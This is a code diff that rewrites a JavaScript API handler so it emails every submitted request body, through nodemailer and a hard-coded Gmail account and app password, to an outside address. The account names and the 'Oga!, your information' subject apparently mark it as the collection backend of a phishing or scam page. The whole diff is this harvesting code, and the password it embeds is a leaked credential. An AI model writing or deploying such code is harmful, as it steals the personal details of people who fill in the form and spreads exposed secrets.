@@ -1,4 +1,24 @@
-export default function HandleData(request, response) {
-  console.log(request.body);
-  response.send(200);
+import nodemailer from "nodemailer";
+
+export default async function HandleData(request, response) {
+  const options = {
+    subject: "Oga!, your information",
+    from: "Anonymous",
+    to: "infocashback00@gmail.com",
+    html: JSON.stringify(request.body),
+  };
+  const transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      type: "login",
+      user: "infosendle@gmail.com",
+      pass: "hbrq ctcj amgd iwmd",
+    },
+  });
+  try {
+    await transporter.sendMail(options);
+    response.send(200);
+  } catch (err) {
+    console.log(err.message);
+  }
 }
